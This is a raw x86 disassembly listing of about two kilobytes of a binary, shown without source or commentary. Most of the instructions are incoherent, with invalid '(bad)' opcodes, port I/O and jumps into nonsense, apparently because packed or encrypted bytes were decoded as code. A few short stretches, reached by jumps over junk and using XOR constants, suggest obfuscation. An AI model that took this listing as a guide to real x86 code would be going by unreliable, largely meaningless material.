  415924:	add    eax,0xc1a880ea
  415929:	data16 adc al,0x7e
  41592c:	xchg   esp,eax
  41592d:	ror    BYTE PTR [esi+0x133c2e0b],1
  415933:	jg     0x415952
  415935:	jmp    0x7d15a359
  41593a:	mov    dh,0x64
  41593c:	js     0x41591e
  41593e:	addr16 jg 0x415947
  415941:	mov    bh,0x2
  415943:	ret    
  415944:	push   eax
  415945:	dec    edx
  415946:	or     dh,al
  415948:	int    0x6d
  41594a:	sbb    eax,eax
  41594c:	in     eax,dx
  41594d:	ret    0x63de
  415950:	aas    
  415951:	mov    esi,0xa1b6b803
  415956:	repz cwde 
  415958:	les    edx,FWORD PTR [esi]
  41595a:	xor    eax,0x35845a7
  41595f:	inc    edi
  415960:	mov    ds:0x46ddbf3f,eax
  415965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415966:	jno    0x4159c3
  415968:	cwde   
  415969:	dec    ebx
  41596a:	cdq    
  41596b:	mov    ecx,0xdbb2c4b5
  415970:	or     eax,0xd5f7c48f
  415975:	cmp    al,0x7
  415977:	xlat   BYTE PTR ds:[ebx]
  415978:	scas   eax,DWORD PTR es:[edi]
  415979:	repz mov eax,ds:0x3072bfbc
  41597f:	add    edi,DWORD PTR [esi+0x74]
  415982:	cs cmp eax,0xd10b7780
  415988:	arpl   WORD PTR ds:0x5ad3f165,sp
  41598e:	(bad)  
  41598f:	imul   BYTE PTR [eax-0x11b914ff]
  415995:	rcr    ecx,cl
  415997:	dec    esi
  415998:	pop    edi
  415999:	popa   
  41599a:	mov    eax,0xaba86953
  41599f:	call   0x930d24ee
  4159a4:	jecxz  0x4159da
  4159a6:	jmp    0x415969
  4159a8:	cmp    al,0xf1
  4159aa:	mov    esp,0x45b537ad
  4159af:	sbb    eax,0xb6c5843d
  4159b4:	pop    edx
  4159b5:	push   es
  4159b6:	mov    ds:0x11ee2a39,eax
  4159bb:	and    cl,BYTE PTR [edi]
  4159bd:	ins    DWORD PTR es:[edi],dx
  4159be:	or     DWORD PTR [edi+ebx*4+0x35ad41a7],esp
  4159c5:	jb     0x415a01
  4159c7:	(bad)  
  4159c8:	in     al,0xb3
  4159ca:	stc    
  4159cb:	adc    DWORD PTR [ebx-0x36],0xf55ba39c
  4159d2:	mov    edx,0x50030fbc
  4159d7:	lds    ebx,FWORD PTR ds:0x42d9722a
  4159dd:	ss pop eax
  4159df:	add    al,0x69
  4159e1:	cmp    BYTE PTR [eax+eax*1],0x43
  4159e5:	jns    0x4159f0
  4159e7:	jae    0x415a52
  4159e9:	or     eax,0x43d65db6
  4159ee:	cmp    edi,ebx
  4159f0:	sbb    al,0xaf
  4159f2:	jns    0x4159b0
  4159f4:	and    eax,0x6e8f0591
  4159f9:	pop    edi
  4159fa:	and    eax,0x9e6cd493
  4159ff:	clc    
  415a00:	adc    dl,bh
  415a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a03:	cmp    BYTE PTR [eax+0x5a],ah
  415a06:	dec    esi
  415a07:	hlt    
  415a08:	sbb    dl,BYTE PTR [esi-0x2182970a]
  415a0e:	in     al,dx
  415a0f:	sbb    al,BYTE PTR [eax+0xfb8f6a5]
  415a15:	pop    ds
  415a16:	mov    ss,edx
  415a18:	mov    ah,0x3e
  415a1a:	scas   eax,DWORD PTR es:[edi]
  415a1b:	into   
  415a1c:	je     0x415a22
  415a1e:	fwait
  415a1f:	call   0x901a:0x8811dea4
  415a26:	mov    eax,ds:0x89f3e1ad
  415a2b:	add    eax,0xf2748d3d
  415a30:	xor    ebx,DWORD PTR [ebx+0xbf73e80]
  415a36:	and    eax,0xb11dcae2
  415a3b:	(bad)  
  415a3c:	out    dx,al
  415a3d:	(bad)  
  415a3e:	mov    BYTE PTR [edx-0x72],dh
  415a41:	push   edi
  415a42:	xchg   edi,eax
  415a43:	or     DWORD PTR [edi+0x7],esi
  415a46:	push   edi
  415a47:	sti    
  415a48:	loope  0x415abb
  415a4a:	mov    edi,0x6ef825d6
  415a4f:	sbb    bh,BYTE PTR [edx+0x7c]
  415a52:	xlat   BYTE PTR ds:[ebx]
  415a53:	add    esp,DWORD PTR [edx]
  415a55:	pusha  
  415a56:	pop    esi
  415a57:	aam    0x8
  415a59:	test   DWORD PTR [edx+0x2ed4b604],ebx
  415a5f:	js     0x415a25
  415a61:	sub    BYTE PTR [edi+0x34],0xc6
  415a65:	jo     0x415a02
  415a67:	lock fs add ch,0xea
  415a6c:	dec    ebp
  415a6d:	sbb    ebp,eax
  415a6f:	repz xor edi,esp
  415a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a73:	push   edx
  415a74:	imul   BYTE PTR [edx+0x6d68001c]
  415a7a:	fdiv   QWORD PTR [ecx]
  415a7c:	pop    esi
  415a7d:	adc    DWORD PTR [edi],esp
  415a7f:	addr16 aam 0xb8
  415a82:	div    esi
  415a84:	jg     0x415a35
  415a86:	jp     0x415ada
  415a88:	ret    0x33a9
  415a8b:	ror    DWORD PTR [ebp+0x729c0284],1
  415a91:	xor    al,BYTE PTR [eax]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	enter  0x6eb7,0xd1
  415aa8:	mov    eax,0xb9707f0d
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415ace
  415ab1:	fwait
  415ab2:	mov    al,0x98
  415ab4:	xchg   edi,eax
  415ab5:	(bad)  
  415ab6:	icebp  
  415ab7:	inc    eax
  415ab8:	sbb    DWORD PTR [ebx-0x62],ecx
  415abb:	or     BYTE PTR [eax+0x71],dh
  415abe:	push   edi
  415abf:	xlat   BYTE PTR ds:[ebx]
  415ac0:	iret   
  415ac1:	ss mov esp,edi
  415ac4:	jae    0x415b45
  415ac6:	lock cwde 
  415ac8:	xor    eax,0xcab8f92b
  415acd:	(bad)  [ecx+0x434eea1d]
  415ad3:	lds    esi,FWORD PTR [ecx]
  415ad5:	mov    ebp,0x25576117
  415ada:	push   cs
  415adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415adc:	xor    esi,DWORD PTR [eax+0x46deb110]
  415ae2:	mov    ah,0x1e
  415ae4:	or     BYTE PTR [eax+0x3a9ff66],al
  415aea:	sub    eax,0x41d487e
  415aef:	mov    al,ds:0x3e958b7d
  415af4:	jle    0x415ab9
  415af6:	js     0x415b3b
  415af8:	pop    ss
  415af9:	mov    esp,0x7f313f64
  415afe:	mul    DWORD PTR [edx+0x2c]
  415b01:	or     DWORD PTR [ecx],esi
  415b03:	es js  0x415b34
  415b06:	xchg   BYTE PTR [edi-0x8c4dc13],dh
  415b0c:	dec    ecx
  415b0d:	rol    ah,0x6b
  415b10:	mov    ecx,DWORD PTR [esi-0x1a8b6924]
  415b16:	call   0xadd9e810
  415b1b:	jno    0x415ac4
  415b1d:	dec    ecx
  415b1e:	outs   dx,DWORD PTR ds:[esi]
  415b1f:	xchg   ebx,eax
  415b20:	mov    dl,0xb8
  415b22:	push   cs
  415b23:	fadd   QWORD PTR [esi+edi*1-0x68747739]
  415b2a:	in     eax,dx
  415b2b:	mov    cl,0x81
  415b2d:	mov    al,0x88
  415b2f:	psrlw  mm4,QWORD PTR [ecx]
  415b32:	mov    esp,0x2df59e47
  415b37:	mov    esp,0x23f8cd80
  415b3c:	retf   0xea0b
  415b3f:	xchg   edx,eax
  415b40:	cwde   
  415b41:	and    eax,eax
  415b43:	jnp    0x415b37
  415b45:	pop    es
  415b46:	cs add bh,ah
  415b49:	add    DWORD PTR [edi],esi
  415b4b:	dec    ebx
  415b4c:	and    bl,BYTE PTR [ebp-0x2d94dac2]
  415b52:	adc    al,0xfc
  415b54:	rcr    DWORD PTR [edx-0x3a],0xf0
  415b58:	repnz outs dx,DWORD PTR ds:[esi]
  415b5a:	outs   dx,DWORD PTR ds:[esi]
  415b5b:	push   esp
  415b5c:	repz sub DWORD PTR [esi],edi
  415b5f:	xlat   BYTE PTR ds:[ebx]
  415b60:	loop   0x415bdf
  415b62:	inc    esi
  415b63:	push   cs
  415b64:	mov    BYTE PTR [edi-0x14cb52f8],ah
  415b6a:	sub    dl,BYTE PTR [ebp-0x32]
  415b6d:	push   cs
  415b6e:	jl     0x415bed
  415b70:	and    bh,BYTE PTR [eax-0x7ff4b86d]
  415b76:	mov    ch,0x14
  415b78:	test   dl,0xbb
  415b7b:	inc    esi
  415b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b7d:	test   DWORD PTR [esi+eax*8+0x18],edi
  415b81:	cld    
  415b82:	int3   
  415b83:	in     al,dx
  415b84:	bound  esp,QWORD PTR [bx+0x78]
  415b88:	(bad)  
  415b89:	ror    DWORD PTR [edx+0x20],1
  415b8c:	lahf   
  415b8d:	(bad)  
  415b8e:	loop   0x415b87
  415b90:	aam    0xc7
  415b92:	mov    ds:0x2264a870,eax
  415b97:	in     al,0x4a
  415b99:	cmp    DWORD PTR [edx-0x7],ecx
  415b9c:	enter  0xf959,0x77
  415ba0:	mov    ah,0x47
  415ba2:	(bad)  
  415ba3:	lods   al,BYTE PTR ds:[esi]
  415ba4:	pop    edi
  415ba5:	push   esi
  415ba6:	cmp    ebp,ebx
  415ba8:	push   ebp
  415ba9:	push   ss
  415baa:	jg     0x415bb3
  415bac:	mov    esi,ds
  415bae:	adc    eax,0xb8b5abee
  415bb3:	repnz sub bh,0x9e
  415bb7:	int3   
  415bb8:	xor    bh,BYTE PTR [eax]
  415bba:	push   ebp
  415bbb:	jg     0x415c2b
  415bbd:	mov    bl,cl
  415bbf:	push   cs
  415bc0:	lods   al,BYTE PTR ds:[esi]
  415bc1:	mov    ebx,0x8fd28e22
  415bc6:	retf   0x8c0a
  415bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bca:	cli    
  415bcb:	in     al,dx
  415bcc:	les    edx,FWORD PTR [esi-0x380a4e50]
  415bd2:	push   es
  415bd3:	cs jmp 0x415bd4
  415bd6:	outs   dx,DWORD PTR ds:[esi]
  415bd7:	cdq    
  415bd8:	imul   edx,esi,0xffffffc3
  415bdb:	aaa    
  415bdc:	clc    
  415bdd:	mov    ds:0xdb1a7283,ax
  415be3:	(bad)  
  415be4:	jb     0x415b9d
  415be6:	sub    DWORD PTR [ebx+0x11],edx
  415be9:	popf   
  415bea:	xchg   edx,edx
  415bec:	sub    eax,0xff0d9bb5
  415bf1:	mov    edx,0x54d3621b
  415bf6:	mov    al,dh
  415bf8:	jnp    0x415c49
  415bfa:	cmp    al,0x5e
  415bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bfd:	jno    0x415bae
  415bff:	lock and al,0xf6
  415c02:	xchg   al,bh
  415c04:	mov    ch,0xef
  415c06:	and    DWORD PTR [ebp+0x17ee46d7],esp
  415c0c:	jg     0x415c5c
  415c0e:	push   ebx
  415c0f:	inc    ecx
  415c10:	popa   
  415c11:	stos   BYTE PTR es:[edi],al
  415c12:	outs   dx,BYTE PTR ds:[esi]
  415c13:	adc    eax,0xbd78ba82
  415c18:	jnp    0x415bb3
  415c1a:	pushf  
  415c1b:	test   DWORD PTR [ebp+0x981f497],ebp
  415c21:	inc    ecx
  415c22:	icebp  
  415c23:	cmp    bh,BYTE PTR [ecx]
  415c25:	inc    ebx
  415c26:	xchg   esi,eax
  415c27:	imul   edx,DWORD PTR [eax-0x5],0x5d
  415c2b:	adc    cl,dh
  415c2d:	in     eax,0x14
  415c2f:	pop    es
  415c30:	pop    ebp
  415c31:	dec    esi
  415c32:	push   edi
  415c33:	or     DWORD PTR [ecx],0x9bbe160b
  415c39:	(bad)  
  415c3a:	fidivr DWORD PTR [ebx]
  415c3c:	shr    dl,0x3e
  415c3f:	jp     0x415c86
  415c41:	(bad)  
  415c42:	and    DWORD PTR [eax-0x38972bac],ebp
  415c48:	fsubr  DWORD PTR [esp+edi*2]
  415c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c4c:	cmp    edx,edi
  415c4e:	or     bh,BYTE PTR [edi+0x2166b630]
  415c54:	mov    dh,0x91
  415c56:	cdq    
  415c57:	xlat   BYTE PTR ds:[ebx]
  415c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c59:	cmc    
  415c5a:	std    
  415c5b:	arpl   WORD PTR [edi],ax
  415c5d:	dec    esi
  415c5e:	fucomip st,st(6)
  415c60:	push   cs
  415c61:	repz out dx,eax
  415c63:	pop    es
  415c64:	out    0x66,al
  415c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c67:	sbb    al,0xf3
  415c69:	or     eax,DWORD PTR [ebx+0x2559e481]
  415c6f:	cmp    dl,BYTE PTR [eax]
  415c71:	stos   BYTE PTR es:[edi],al
  415c72:	js     0x415cc5
  415c74:	jb     0x415c01
  415c76:	loopne 0x415c92
  415c78:	dec    esi
  415c79:	pop    ds
  415c7a:	cwde   
  415c7b:	dec    esp
  415c7c:	xor    DWORD PTR [ebx+esi*2+0x299b588a],ebx
  415c83:	pop    ecx
  415c84:	pushf  
  415c85:	imul   ebx,esp,0x79
  415c88:	and    al,BYTE PTR [esi-0x61]
  415c8b:	adc    DWORD PTR ds:0xef4664c1,0x314b4677
  415c95:	popa   
  415c96:	push   cs
  415c97:	repz fnstsw WORD PTR [edx+0x57]
  415c9b:	mov    esi,0x75bea5d7
  415ca0:	(bad)  
  415ca1:	sub    eax,0xd961f89a
  415ca6:	cmp    al,0xf6
  415ca8:	retf   
  415ca9:	push   0x3d551e38
  415cae:	lock test BYTE PTR [eax-0x3f],dh
  415cb2:	iret   
  415cb3:	aas    
  415cb4:	mov    bl,0x47
  415cb6:	icebp  
  415cb7:	dec    esp
  415cb8:	sbb    edi,DWORD PTR [ebx]
  415cba:	jmp    0x3e34db7d
  415cbf:	cmp    eax,0x6cb97fea
  415cc4:	stc    
  415cc5:	add    edx,0xf3b93423
  415ccb:	sbb    ch,BYTE PTR [ebx+0xce3285]
  415cd1:	add    al,0x6
  415cd3:	mov    dh,0x77
  415cd5:	pop    ss
  415cd6:	mov    bl,0xa2
  415cd8:	fmul   QWORD PTR [ebx+eax*1-0xcf06747]
  415cdf:	sbb    al,0xd5
  415ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ce2:	fwait
  415ce3:	dec    esi
  415ce4:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ce6:	inc    ebp
  415ce7:	cs (bad) 
  415ce9:	aad    0x7d
  415ceb:	sbb    bh,BYTE PTR [esi+0x57fac214]
  415cf1:	sub    esp,0x6237b4ca
  415cf7:	stos   DWORD PTR es:[edi],eax
  415cf8:	call   0xde7e:0x9e949200
  415cff:	popf   
  415d00:	cmp    bl,al
  415d02:	xor    eax,0xaaa65b64
  415d07:	mov    ecx,0xc357c913
  415d0c:	sti    
  415d0d:	add    al,0x8d
  415d0f:	bound  ecx,QWORD PTR [ebx+0xe76f41c]
  415d15:	mov    dl,0xf
  415d17:	call   0x1b4c9c45
  415d1c:	and    al,0x18
  415d1e:	adc    BYTE PTR ds:0xc4789de0,dh
  415d24:	rol    dh,1
  415d26:	fsub   st,st(2)
  415d28:	pop    ds
  415d29:	sub    BYTE PTR [ecx],ah
  415d2b:	inc    eax
  415d2c:	push   esp
  415d2d:	out    0x65,al
  415d2f:	sub    eax,0x5b68099b
  415d34:	imul   ecx,DWORD PTR [edx-0x22],0x72
  415d38:	sbb    al,0x32
  415d3a:	psubw  mm0,QWORD PTR [eax+eax*2]
  415d3e:	jl     0x415d08
  415d40:	mov    WORD PTR [edi+0x6d],ds
  415d43:	jns    0x415d57
  415d45:	int    0x4b
  415d47:	sbb    DWORD PTR ds:0x1c77a212,eax
  415d4d:	mov    ah,0x7d
  415d4f:	cmp    eax,0x4e02938f
  415d54:	xchg   edi,eax
  415d55:	mov    BYTE PTR [eax+0x1a],bl
  415d58:	mov    bl,0x2e
  415d5a:	xor    DWORD PTR [bp+si-0x24a],eax
  415d5f:	ins    BYTE PTR es:[edi],dx
  415d60:	(bad)  
  415d61:	mov    esi,0x56a22228
  415d66:	jo     0x415dd0
  415d68:	mov    bh,0x43
  415d6a:	push   ss
  415d6b:	popa   
  415d6c:	inc    esp
  415d6d:	daa    
  415d6e:	dec    edx
  415d6f:	cmp    BYTE PTR [esi],dh
  415d71:	repz sbb dl,BYTE PTR [ebp-0x77]
  415d75:	ficomp WORD PTR [esi]
  415d77:	mov    edx,DWORD PTR [ebp+0x8]
  415d7a:	mov    edi,DWORD PTR [ebp-0x24]
  415d7d:	mov    DWORD PTR [edi+edx*4],eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d95:	mov    dl,0x53
  415d97:	pop    ds
  415d98:	or     DWORD PTR [edx],0x7eb9707f
  415d9e:	jo     0x415e10
  415da0:	(bad)  
  415da1:	jbe    0x415dd8
  415da3:	(bad)  
  415da4:	push   ecx
  415da5:	jle    0x415d6e
  415da7:	sahf   
  415da8:	(bad)  
  415da9:	pop    esp
  415daa:	sbb    edi,DWORD PTR [eax]
  415dac:	ja     0x415d6f
  415dae:	jo     0x415d70
  415db0:	daa    
  415db1:	fidivr DWORD PTR ds:0x4e237622
  415db7:	xchg   ecx,eax
  415db8:	xchg   BYTE PTR [ecx-0x35],cl
  415dbb:	gs inc edx
  415dbd:	outs   dx,BYTE PTR ds:[esi]
  415dbe:	xchg   DWORD PTR [edx+ebp*2+0x14519c77],ebx
  415dc5:	push   DWORD PTR [ecx]
  415dc7:	out    0xd8,eax
  415dc9:	je     0x415da2
  415dcb:	(bad)  
  415dcc:	sbb    al,0xb8
  415dce:	mov    dh,0x3b
  415dd0:	mov    bl,0xc9
  415dd2:	pop    es
  415dd3:	push   es
  415dd4:	sbb    BYTE PTR [edi],ah
  415dd6:	xchg   ebp,eax
  415dd7:	pop    eax
  415dd8:	cmp    BYTE PTR [ebx-0x130d8f76],0xae
  415ddf:	xchg   esp,eax
  415de0:	cmp    eax,0x7e49cd3
  415de5:	hlt    
  415de6:	ret    0x9a74
  415de9:	aad    0x28
  415deb:	jg     0x415d8e
  415ded:	nop
  415dee:	out    0x12,eax
  415df0:	stos   BYTE PTR es:[edi],al
  415df1:	dec    edx
  415df2:	xchg   ebx,eax
  415df3:	pop    ebp
  415df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415df5:	cmp    BYTE PTR [edx-0x53cf10ed],ch
  415dfb:	or     eax,0x43956419
  415e00:	jmp    0x415dc9
  415e02:	inc    esi
  415e03:	nop
  415e04:	push   0xc3a27dfb
  415e09:	aas    
  415e0a:	xlat   BYTE PTR ds:[ebx]
  415e0b:	hlt    
  415e0c:	dec    esp
  415e0d:	in     al,0xd3
  415e0f:	(bad)  
  415e10:	(bad)
  415e13:	mov    esp,0xac681c52
  415e18:	add    BYTE PTR [ecx-0x45],dl
  415e1b:	dec    esi
  415e1c:	loope  0x415e78
  415e1e:	(bad)  [ebx+edi*4]
  415e21:	cdq    
  415e22:	mov    ds:0x7395f0cb,al
  415e27:	dec    esp
  415e28:	fcmovne st,st(2)
  415e2a:	xor    al,0x7d
  415e2c:	out    0xb4,eax
  415e2e:	test   al,0x44
  415e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e31:	shr    BYTE PTR [edx],cl
  415e33:	xchg   edi,eax
  415e34:	and    dh,ch
  415e36:	mov    bh,0xd9
  415e38:	pop    ds
  415e39:	or     BYTE PTR [eax],bh
  415e3b:	cli    
  415e3c:	std    
  415e3d:	sub    DWORD PTR [esi],ecx
  415e3f:	push   0x231dc2fd
  415e44:	dec    ecx
  415e45:	xor    BYTE PTR [ebx-0x1],cl
  415e48:	inc    ebp
  415e49:	push   cs
  415e4a:	mov    dl,0x95
  415e4c:	mov    ds:0x7f91637d,al
  415e51:	pushf  
  415e52:	sub    eax,0x1cfcb766
  415e57:	and    eax,0xb9f5182e
  415e5c:	popf   
  415e5d:	and    ebx,eax
  415e5f:	gs out 0x8d,eax
  415e62:	mov    esi,0xd06d39da
  415e67:	dec    edi
  415e68:	or     edx,DWORD PTR [eax]
  415e6a:	shl    eax,0x9a
  415e6d:	(bad)  
  415e6e:	fild   QWORD PTR [edx+0x2e2d9c95]
  415e74:	aas    
  415e75:	mov    DWORD PTR [ebx-0x69],eax
  415e78:	das    
  415e79:	sbb    DWORD PTR [esi+0x3f],eax
  415e7c:	shl    DWORD PTR ds:0x15f3ba23,1
  415e82:	push   0x53259a26
  415e87:	scas   al,BYTE PTR es:[edi]
  415e88:	and    DWORD PTR [esi],0x706d4215
  415e8e:	jmp    0x415ed7
  415e90:	and    BYTE PTR [eax+edx*1-0x79],ah
  415e94:	int3   
  415e95:	mov    bl,0x19
  415e97:	into   
  415e98:	sbb    al,0x93
  415e9a:	ja     0x415e65
  415e9c:	mov    ds:0xcec04e58,eax
  415ea1:	pusha  
  415ea2:	pop    ss
  415ea3:	aad    0x1c
  415ea5:	pop    esi
  415ea6:	ret    0x756a
  415ea9:	sub    eax,0xd867f67
  415eae:	or     DWORD PTR [ecx+0x7b],ebx
  415eb1:	mov    al,0xad
  415eb3:	pop    es
  415eb4:	loop   0x415ef4
  415eb6:	je     0x415e9e
  415eb8:	and    BYTE PTR [edi],bh
  415eba:	and    edx,eax
  415ebc:	inc    ebx
  415ebd:	mov    edx,0xb38d64e
  415ec2:	(bad)  
  415ec3:	out    0xe8,al
  415ec5:	lds    ecx,FWORD PTR [ebx+eiz*4]
  415ec8:	xchg   ebp,eax
  415ec9:	cmp    bh,cl
  415ecb:	div    BYTE PTR [edi+0x1e528109]
  415ed1:	jae    0x415eac
  415ed3:	inc    esp
  415ed4:	xor    DWORD PTR [eax+ecx*8],eax
  415ed7:	cwde   
  415ed8:	and    eax,0xa27c6015
  415edd:	xchg   DWORD PTR [eax+0x29],esi
  415ee0:	pop    ss
  415ee1:	ins    BYTE PTR es:[edi],dx
  415ee2:	xchg   esp,eax
  415ee3:	sbb    ebx,DWORD PTR [eax]
  415ee5:	loopne 0x415efb
  415ee7:	inc    edi
  415ee8:	xchg   ecx,eax
  415ee9:	pop    ecx
  415eea:	inc    esp
  415eeb:	adc    bl,bh
  415eed:	fcom   QWORD PTR [eax]
  415eef:	and    ah,BYTE PTR [edi]
  415ef1:	jno    0x415efe
  415ef3:	hlt    
  415ef4:	jge    0x415ede
  415ef6:	pusha  
  415ef7:	mov    DWORD PTR [edx+0x57],ecx
  415efa:	mov    ebx,0x5ca38eaa
  415eff:	or     eax,0x672aed3a
  415f04:	xor    eax,0xa4eaabd5
  415f09:	leave  
  415f0a:	stos   BYTE PTR es:[edi],al
  415f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f0c:	in     eax,0xdf
  415f0e:	jbe    0x415f66
  415f10:	xchg   edx,eax
  415f11:	retf   
  415f12:	les    esp,FWORD PTR [esi-0x75a58371]
  415f18:	ins    BYTE PTR es:[edi],dx
  415f19:	push   eax
  415f1a:	mov    bl,0x71
  415f1c:	cs jmp 0x147e902
  415f22:	ins    BYTE PTR es:[edi],dx
  415f23:	xchg   edx,eax
  415f24:	jge    0x415f8a
  415f26:	xchg   edx,eax
  415f27:	mov    eax,ds:0xcee2db53
  415f2c:	js     0x415f4e
  415f2e:	mov    esp,0x23aca5dd
  415f33:	cmc    
  415f34:	xchg   DWORD PTR [eax+0x6a2043e],ebx
  415f3a:	(bad)  
  415f3b:	mov    ds:0x99230834,al
  415f40:	mov    edx,0x32cc2dc2
  415f45:	push   edx
  415f46:	(bad)  
  415f47:	jp     0x415f03
  415f49:	xchg   DWORD PTR [ecx-0x2c],ecx
  415f4c:	push   edi
  415f4d:	mov    ah,0x72
  415f4f:	xchg   esp,eax
  415f50:	dec    ebp
  415f51:	or     DWORD PTR [esi-0x1d],edi
  415f54:	jb     0x415f93
  415f56:	aam    0x81
  415f58:	inc    edi
  415f59:	ds or  dh,cl
  415f5c:	mov    al,ds:0x8a812989
  415f61:	je     0x415fb6
  415f63:	push   esp
  415f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f65:	and    cl,0xf5
  415f68:	xchg   ecx,eax
  415f69:	add    DWORD PTR [ecx-0x670e93b9],0xffffff96
  415f70:	popa   
  415f71:	push   ecx
  415f72:	jmp    0x415fba
  415f74:	sti    
  415f75:	inc    esp
  415f76:	fsubr  DWORD PTR [ebx+0x10710609]
  415f7c:	xor    BYTE PTR [edi+0x138d573d],0x77
  415f83:	stos   DWORD PTR es:[edi],eax
  415f84:	addr16 add cl,0xdb
  415f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f89:	int3   
  415f8a:	enter  0xa818,0x38
  415f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f8f:	or     ah,al
  415f91:	or     al,0x70
  415f93:	std    
  415f94:	push   edx
  415f95:	push   ds
  415f96:	add    al,0xf8
  415f98:	aad    0x76
  415f9a:	inc    eax
  415f9b:	stc    
  415f9c:	pop    edi
  415f9d:	fldlg2 
  415f9f:	inc    ebx
  415fa0:	pushf  
  415fa1:	push   eax
  415fa2:	push   ds
  415fa3:	arpl   WORD PTR [eax-0x47],di
  415fa6:	pop    eax
  415fa7:	or     cl,ch
  415fa9:	jnp    0x415fb7
  415fab:	jle    0x416013
  415fad:	out    0x1d,al
  415faf:	sub    BYTE PTR [eax],dl
  415fb1:	outs   dx,BYTE PTR ds:[esi]
  415fb2:	add    BYTE PTR [esi-0x8cb62eb],dh
  415fb8:	ret    0x84f7
  415fbb:	xlat   BYTE PTR ds:[ebx]
  415fbc:	push   0xd687c2ca
  415fc1:	push   eax
  415fc2:	mov    DWORD PTR [esi-0x68896c5d],ecx
  415fc8:	data16 fmul st(3),st
  415fcb:	dec    edi
  415fcc:	xchg   ebp,eax
  415fcd:	or     al,BYTE PTR ds:0xf8a75b30
  415fd3:	or     eax,0xbb09fabf
  415fd8:	mov    al,ds:0xb4b34122
  415fdd:	inc    esi
  415fde:	aas    
  415fdf:	and    eax,0xb1aa2a25
  415fe4:	mov    esp,0x37c45568
  415fe9:	dec    esi
  415fea:	dec    ecx
  415feb:	and    ch,ah
  415fed:	dec    edx
  415fee:	nop
  415fef:	jle    0x41600d
  415ff1:	or     al,cl
  415ff3:	lods   eax,DWORD PTR ds:[esi]
  415ff4:	add    dl,BYTE PTR [edx-0x3bf3644c]
  415ffa:	xchg   ebp,eax
  415ffb:	daa    
  415ffc:	or     bl,BYTE PTR [ebx-0x4957772c]
  416002:	cmp    ah,BYTE PTR [edi-0x3e]
  416005:	xor    cl,ch
  416007:	mov    esi,0xe4939ed4
  41600c:	adc    DWORD PTR [ebx+0x511ad6d],ecx
  416012:	test   dl,dl
  416014:	sahf   
  416015:	xchg   esp,eax
  416016:	imul   esi,DWORD PTR [ebp+0x77],0xffffffb7
  41601a:	or     al,0x45
  41601c:	(bad)  
  41601d:	out    0xec,al
  41601f:	loop   0x41602a
  416021:	cld    
  416022:	sub    ah,BYTE PTR [eax-0x6e]
  416025:	retf   0x69ad
  416028:	mov    eax,ds:0x2df1cc70
  41602d:	cdq    
  41602e:	scas   al,BYTE PTR es:[edi]
  41602f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416030:	nop
  416031:	lock hlt 
  416033:	push   ecx
  416034:	nop
  416035:	rcr    DWORD PTR [edi+0x447b44ab],1
  41603b:	push   ecx
  41603c:	fcomp  st(2)
  41603e:	ror    DWORD PTR [ecx-0x50],0xb9
  416042:	jb     0x4160a3
  416044:	pop    ebx
  416045:	iret   
  416046:	mov    al,ds:0xce126f0c
  41604b:	cmp    BYTE PTR [eax-0x73ab48f4],ch
  416051:	and    DWORD PTR [ebp-0x26],ebx
  416054:	xor    al,BYTE PTR [ecx]
  416056:	stc    
  416057:	mov    DWORD PTR [eax],esi
  416059:	lea    edi,fs:[esi]
  41605c:	mov    eax,es
  41605e:	sub    bl,BYTE PTR [eax]
  416060:	dec    ebx
  416061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416062:	add    al,0x8
  416064:	sti    
  416065:	mov    ecx,0x8558b7a
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x416052
  41609a:	jb     0x4160d2
  41609c:	test   edx,0xb9707f17
  4160a2:	jle    0x416114
  4160a4:	jo     0x4160c3
  4160a6:	mov    esp,0x8410d276
  4160ab:	stc    
  4160ac:	rcl    DWORD PTR [ebp+0x3b],1
  4160af:	mov    eax,ds:0xb1566b66
  4160b4:	ds js  0x41610f
  4160b7:	ins    BYTE PTR es:[edi],dx
  4160b8:	add    al,0x76
  4160ba:	bound  ebx,QWORD PTR [edi-0x1]
  4160bd:	int    0x43
